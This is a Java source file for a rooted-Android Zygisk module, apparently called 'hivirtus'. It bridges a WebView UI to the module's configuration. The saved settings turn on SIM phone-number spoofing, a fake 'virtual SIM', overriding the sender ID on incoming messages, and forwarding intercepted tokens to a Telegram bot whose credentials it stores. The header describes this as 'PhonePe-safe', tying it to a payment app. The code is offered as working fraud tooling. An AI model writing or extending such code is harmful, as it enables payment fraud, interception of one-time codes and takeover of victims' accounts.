package com.hivirtus.zygisk;

import android.content.Context;
import android.os.Environment;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import org.json.JSONObject;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.nio.charset.StandardCharsets;

/** Tiny bridge — WebView HTML UI ↔ module config (PhonePe-safe multi-path save). */
public class HivirtusJsBridge {
    private static final String SAVE_TMP = "/data/local/tmp/hivirtus_ui_save.json";
    private static final String RUNTIME_CFG = "/data/local/tmp/hivirtus_zygisk_mode_config.json";
    private static final String MODULE_CFG = "/data/adb/modules/hivirtus_zygisk_mode/config.json";
    private static final String SPOOF_PHONE = "/data/local/tmp/hivirtus_spoof_phone.txt";
    private static final String SENDER_ID_FILE = "/data/local/tmp/hivirtus_sender_id.txt";
    private static final String TG_CREDS = "/data/local/tmp/hivirtus_telegram_credentials.json";
    private static final String TG_TEST_REQ = "/data/local/tmp/hivirtus_tg_test.request";
    private static final String SAVE_OK_FLAG = "/data/local/tmp/hivirtus_save_ok.flag";

    private static Context appCtx;

    public static void setContext(Context ctx) {
        if (ctx != null) appCtx = ctx.getApplicationContext();
    }

    @JavascriptInterface
    public String readConfig() {
        File f = new File(RUNTIME_CFG);
        if (!f.canRead() && appCtx != null) {
            File local = new File(appCtx.getFilesDir(), "hivirtus_ui_save.json");
            if (local.canRead()) f = local;
        }
        if (!f.canRead()) f = new File(MODULE_CFG);
        if (!f.canRead()) return "{}";
        try (InputStreamReader r = new InputStreamReader(new FileInputStream(f), StandardCharsets.UTF_8)) {
            char[] buf = new char[8192];
            StringBuilder sb = new StringBuilder();
            int n;
            while ((n = r.read(buf)) > 0) sb.append(buf, 0, n);
            return sb.toString();
        } catch (Exception e) {
            return "{}";
        }
    }

    @JavascriptInterface
    public void saveConfig(String json) {
        if (json == null || json.isEmpty()) return;
        int wrote = 0;
        try {
            JSONObject incoming = new JSONObject(json);
            JSONObject merged = new JSONObject(readConfig());
            java.util.Iterator<String> keys = incoming.keys();
            while (keys.hasNext()) {
                String k = keys.next();
                merged.put(k, incoming.get(k));
            }

            if (merged.optBoolean("enable_sim1_mock", false)
                    || merged.optBoolean("enable_phone_spoof", false)
                    || merged.optBoolean("fake_number_enabled", false)
                    || merged.optBoolean("enable_virtual_sim", false)) {
                merged.put("enable_sim1_mock", true);
                merged.put("enable_phone_spoof", true);
                String phone = merged.optString("mock_phone_sim1", "").trim();
                if (phone.length() >= 10) {
                    merged.put("enable_virtual_sim", true);
                    writeEverywhere(SPOOF_PHONE, "hivirtus_spoof_phone.txt", phone + "\n");
                }
            }

            String sid = merged.optString("inject_sender_id", "").trim();
            if ("AD-TEST-S".equals(sid)) {
                sid = "";
                merged.put("inject_sender_id", "");
            }
            if (!sid.isEmpty()) {
                merged.put("override_incoming_sender", true);
                merged.put("sender_id_enabled", true);
                writeEverywhere(SENDER_ID_FILE, "hivirtus_sender_id.txt", sid + "\n");
            } else if (merged.optBoolean("sender_id_enabled", false)
                    || merged.optBoolean("override_incoming_sender", false)) {
                merged.put("override_incoming_sender", true);
            }

            if (merged.optBoolean("auto_forward_token", false)
                    || merged.optBoolean("telegram_enabled", false)
                    || merged.optBoolean("fake_intercept_telegram", false)) {
                merged.put("auto_forward_token", true);
                merged.put("fake_intercept_telegram", true);
                merged.put("telegram_enabled", true);
            }
            String tgToken = merged.optString("telegram_bot_token", "").trim();
            String tgChat = merged.optString("telegram_chat_id", "").trim();
            String body = merged.toString(2);
            wrote += writeEverywhere(SAVE_TMP, "hivirtus_ui_save.json", body);
            wrote += writeEverywhere(RUNTIME_CFG, "hivirtus_zygisk_mode_config.json", body);

            if (!tgToken.isEmpty() && !tgChat.isEmpty()) {
                String creds = "{\n  \"telegram_bot_token\": \"" + tgToken.replace("\"", "")
                        + "\",\n  \"telegram_chat_id\": \"" + tgChat.replace("\"", "")
                        + "\"\n}\n";
                wrote += writeEverywhere(TG_CREDS, "hivirtus_telegram_credentials.json", creds);
                wrote += writeEverywhere(TG_TEST_REQ, "hivirtus_tg_test.request", "1\n");
            }

            if (wrote > 0) {
                writeEverywhere(SAVE_OK_FLAG, "hivirtus_save_ok.flag", "1\n");
            }
        } catch (Exception e) {
            writeEverywhere(SAVE_TMP, "hivirtus_ui_save.json", json);
        }
    }

    /** Write tmp + app filesDir + public Documents (root service harvests all). */
    private static int writeEverywhere(String tmpPath, String fileName, String data) {
        int n = 0;
        if (writeUtf8(tmpPath, data)) n++;
        if (appCtx != null) {
            try {
                File f = new File(appCtx.getFilesDir(), fileName);
                if (writeUtf8(f.getAbsolutePath(), data)) n++;
            } catch (Exception ignored) {
            }
            try {
                File f = new File(appCtx.getCacheDir(), fileName);
                if (writeUtf8(f.getAbsolutePath(), data)) n++;
            } catch (Exception ignored) {
            }
            try {
                File ext = appCtx.getExternalFilesDir(null);
                if (ext != null) {
                    File f = new File(ext, fileName);
                    if (writeUtf8(f.getAbsolutePath(), data)) n++;
                }
            } catch (Exception ignored) {
            }
        }
        try {
            File docs = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
            if (docs != null) {
                //noinspection ResultOfMethodCallIgnored
                docs.mkdirs();
                if (writeUtf8(new File(docs, fileName).getAbsolutePath(), data)) n++;
            }
        } catch (Exception ignored) {
        }
        try {
            File dl = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dl != null) {
                //noinspection ResultOfMethodCallIgnored
                dl.mkdirs();
                if (writeUtf8(new File(dl, fileName).getAbsolutePath(), data)) n++;
            }
        } catch (Exception ignored) {
        }
        return n;
    }

    private static boolean writeUtf8(String path, String data) {
        try (OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(path), StandardCharsets.UTF_8)) {
            w.write(data);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    public static void attach(WebView webView) {
        if (webView == null) return;
        Context c = webView.getContext();
        if (c != null) setContext(c);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setAllowContentAccess(true);
        webView.addJavascriptInterface(new HivirtusJsBridge(), "Hivirtus");
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (url != null && url.startsWith("hivirtus://minimize")) {
                    android.view.ViewParent parent = view.getParent();
                    if (parent instanceof android.view.View) {
                        ((android.view.View) parent).setVisibility(android.view.View.GONE);
                    } else {
                        view.setVisibility(android.view.View.GONE);
                    }
                    return true;
                }
                return false;
            }
        });
    }
}
